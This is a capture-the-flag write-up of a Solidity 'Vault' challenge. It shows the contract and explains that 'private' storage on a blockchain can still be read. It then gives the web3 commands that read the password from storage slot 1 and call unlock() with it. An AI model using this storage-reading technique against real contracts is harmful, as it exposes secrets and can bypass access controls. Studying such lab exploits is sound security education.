# Vault

Unlock the vault to pass the level!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

The trick with this challenge is that everything on the blockchain is public knowledge. The only thing that private does is prevent other contracts from reading a variable. Just noting that if the variable is marked as internal then another contract can inherit and read the data. 

https://www.tutorialspoint.com/solidity/solidity_variable_scope.htm

The following page was found that described reading data from the blockchain it's self. https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925

Using this page I was able to come up with the command to pull the password variable from the contract. 

```js
await web3.eth.getStorageAt(contract.address, 1)
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
```

In this case the 2 varibale (index of 1) is the password variable. 

After getting the password we just call the unlock function with the password.

```js
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
await contract.locked()
false
```

Then we submit and profit.